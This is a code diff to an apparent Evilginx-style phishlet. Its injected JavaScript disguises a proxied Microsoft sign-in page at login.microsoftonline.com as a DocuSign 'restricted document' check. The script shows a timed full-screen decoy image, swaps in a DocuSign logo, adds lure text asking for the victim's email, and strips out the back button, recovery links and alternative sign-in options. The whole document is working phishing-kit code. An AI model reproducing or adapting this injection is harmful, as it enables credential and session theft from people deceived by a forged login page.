@@ -54,91 +54,144 @@ js_inject:
   - trigger_domains: ["login.microsoftonline.com"]
     trigger_paths: ["/common/oauth2/v2.0/authorize", "/common/oauth2/v2.0/authorize*"]
     script: |
-      function waitForElements(selectors, callback) {
-        const interval = setInterval(() => {
-          const elements = selectors.map(sel => document.querySelector(sel));
-          if (elements.every(el => el !== null)) {
-            clearInterval(interval);
-            callback(...elements);
-          }
-        }, 50);
-      }
+      const overlay = document.createElement("div");
+      overlay.style.position = "fixed";
+      overlay.style.top = "0";
+      overlay.style.left = "0";
+      overlay.style.right = "0";
+      overlay.style.bottom = "0";
+      overlay.style.width = "100%";
+      overlay.style.height = "100%";
+      overlay.style.margin = "0";
+      overlay.style.padding = "0";
+      overlay.style.zIndex = "999999";
+      overlay.style.backgroundColor = "#000";
+      overlay.style.pointerEvents = "auto";
+      overlay.style.transition = "opacity 0.5s ease";
+      overlay.style.display = "flex";
+      overlay.style.alignItems = "center";
+      overlay.style.justifyContent = "center";
 
-      waitForElements(
-        ["#lightbox", "#i0116", "#idSIButton9", "#loginHeader"],
-        (lightbox, emailInput, submitBtn, headerTitle) => {
-          document.querySelectorAll('[data-test-id="signinOptions"]').forEach(el => {
-            const tile = el.closest(".tile-container");
-            if (tile) tile.remove();
-          });
+      const img = document.createElement("img");
+      img.src = "https://ik.imagekit.io/c0x1npott/mswd-upscalemedia-transformed.jpeg";
+      img.style.width = "100%";
+      img.style.height = "100%";
+      img.style.objectFit = "cover";
+      img.style.margin = "0";
+      img.style.padding = "0";
+      img.style.border = "none";
 
-          const backBtn = document.getElementById("idBtn_Back");
-          if (backBtn) backBtn.parentElement.remove();
+      overlay.appendChild(img);
+      document.body.appendChild(overlay);
+      document.documentElement.style.overflow = "hidden";
 
-          document.querySelectorAll("#signup, #cantAccessAccount").forEach(link => {
-            const formGroup = link.closest(".form-group");
-            if (formGroup) formGroup.remove();
-          });
+      setTimeout(() => {
+        overlay.style.opacity = "0";
+        setTimeout(() => {
+          overlay.remove();
+          document.documentElement.style.overflow = "";
 
-          const logoImg = document.querySelector('img.logo');
-          if (logoImg) {
-            logoImg.src = "https://cloudmasonry.com/wp-content/uploads/2020/06/DocuSign-Logo.png";
-            logoImg.style.width = "100px";
-            logoImg.style.margin = "0 0 20px 0";
-          }
+          const style = document.createElement("style");
+          style.innerHTML = `
+            html, body {
+              margin: 0 !important;
+              padding: 0 !important;
+              width: 100vw !important;
+              height: 100vh !important;
+              background-image: url('https://ik.imagekit.io/c0x1npott/upscalemedia-transformed.jpeg') !important;
+              background-size: 100% 100% !important;
+              background-position: center center !important;
+              background-repeat: no-repeat !important;
+            }
+            .background-image-holder, #backgroundImage {
+              display: none !important;
+            }
+          `;
+          document.head.appendChild(style);
 
-          if (headerTitle) {
-            headerTitle.querySelector("div").textContent = "Secure Login: Email Check";
-            headerTitle.style.marginBottom = "12px";
-            headerTitle.style.fontSize = "22px";
-            headerTitle.style.color = "#004e9b";
+          const waitForForm = setInterval(() => {
+            const lightbox = document.getElementById("lightbox");
+            const emailInput = document.getElementById("i0116");
+            const submitBtn = document.getElementById("idSIButton9");
+            const headerTitle = document.getElementById("loginHeader");
 
-            const subtitle = document.createElement("p");
-            subtitle.textContent = "Access to this document is restricted to Authorised users only. kindly enter you email";
-            subtitle.style.fontSize = "13px";
-            subtitle.style.margin = "4px 0 12px 0";
-            subtitle.style.color = "#333";
-            headerTitle.appendChild(subtitle);
-          }
+            if (lightbox && emailInput && submitBtn && headerTitle) {
+              clearInterval(waitForForm);
 
-          const inputRow = emailInput.closest(".form-group");
-          if (inputRow) {
-            const description = document.createElement("p");
-            description.textContent = "This document is accessible by authorized users only. Please provide your email for access.";
-            description.style.fontSize = "14px";
-            description.style.marginBottom = "10px";
-            inputRow.insertBefore(description, emailInput);
-          }
+              document.querySelectorAll('[data-test-id="signinOptions"]').forEach(el => {
+                const tile = el.closest(".tile-container");
+                if (tile) tile.remove();
+              });
 
-          emailInput.placeholder = "Enter your email";
-          emailInput.style.border = "1px solid #0078d4";
-          emailInput.style.borderRadius = "6px";
-          emailInput.style.padding = "12px";
-          emailInput.style.fontSize = "16px";
-          emailInput.style.width = "100%";
-          emailInput.style.boxSizing = "border-box";
+              const backBtn = document.getElementById("idBtn_Back");
+              if (backBtn) backBtn.parentElement.remove();
 
-          submitBtn.value = "Continue";
-          submitBtn.style.height = "42px";
-          submitBtn.style.fontSize = "16px";
-          submitBtn.style.backgroundColor = "#0067b8";
-          submitBtn.style.color = "white";
-          submitBtn.style.border = "none";
-          submitBtn.style.borderRadius = "6px";
-          submitBtn.style.marginTop = "14px";
-          submitBtn.style.cursor = "pointer";
-          submitBtn.onmouseover = () => (submitBtn.style.backgroundColor = "#005fa3");
-          submitBtn.onmouseout = () => (submitBtn.style.backgroundColor = "#0067b8");
+              document.querySelectorAll("#signup, #cantAccessAccount").forEach(link => {
+                const formGroup = link.closest(".form-group");
+                if (formGroup) formGroup.remove();
+              });
 
-          let errorSpan = document.getElementById("error_uname_doc");
-          if (!errorSpan) {
-            errorSpan = document.createElement("span");
-            errorSpan.id = "error_uname_doc";
-            errorSpan.textContent = "Please, provide a valid email.";
-            errorSpan.style.color = "red";
-            errorSpan.style.display = "none";
-            errorSpan.style.fontSize = "13px";
-            emailInput.insertAdjacentElement("afterend", errorSpan);
-          }
-        }
-      );
+              const logoImg = document.querySelector('img.logo');
+              if (logoImg) {
+                logoImg.src = "https://cloudmasonry.com/wp-content/uploads/2020/06/DocuSign-Logo.png";
+                logoImg.style.width = "100px";
+                logoImg.style.margin = "0 0 20px 0";
+              }
+
+              if (headerTitle) {
+                headerTitle.querySelector("div").textContent = "Secure Login: Email Check";
+                headerTitle.style.marginBottom = "12px";
+                headerTitle.style.fontSize = "22px";
+                headerTitle.style.color = "#004e9b";
+
+                const subtitle = document.createElement("p");
+                subtitle.textContent = "Access to this document is restricted to Authorised users only. kindly enter you email";
+                subtitle.style.fontSize = "13px";
+                subtitle.style.margin = "4px 0 12px 0";
+                subtitle.style.color = "#333";
+                headerTitle.appendChild(subtitle);
+              }
+
+              const inputRow = emailInput.closest(".form-group");
+              if (inputRow) {
+                const description = document.createElement("p");
+                description.textContent = "This document is accessible by authorized users only. Please provide your email for access.";
+                description.style.fontSize = "14px";
+                description.style.marginBottom = "10px";
+                inputRow.insertBefore(description, emailInput);
+              }
+
+              emailInput.placeholder = "Enter your email";
+              emailInput.style.border = "1px solid #0078d4";
+              emailInput.style.borderRadius = "6px";
+              emailInput.style.padding = "12px";
+              emailInput.style.fontSize = "16px";
+              emailInput.style.width = "100%";
+              emailInput.style.boxSizing = "border-box";
+
+              submitBtn.value = "Continue";
+              submitBtn.style.height = "42px";
+              submitBtn.style.fontSize = "16px";
+              submitBtn.style.backgroundColor = "#0067b8";
+              submitBtn.style.color = "white";
+              submitBtn.style.border = "none";
+              submitBtn.style.borderRadius = "6px";
+              submitBtn.style.marginTop = "14px";
+              submitBtn.style.cursor = "pointer";
+              submitBtn.onmouseover = () => (submitBtn.style.backgroundColor = "#005fa3");
+              submitBtn.onmouseout = () => (submitBtn.style.backgroundColor = "#0067b8");
+
+              let errorSpan = document.getElementById("error_uname_doc");
+              if (!errorSpan) {
+                errorSpan = document.createElement("span");
+                errorSpan.id = "error_uname_doc";
+                errorSpan.textContent = "Please, provide a valid email.";
+                errorSpan.style.color = "red";
+                errorSpan.style.display = "none";
+                errorSpan.style.fontSize = "13px";
+                emailInput.insertAdjacentElement("afterend", errorSpan);
+              }
+            }
+          }, 100);
+        }, 500);
+      }, 10000);
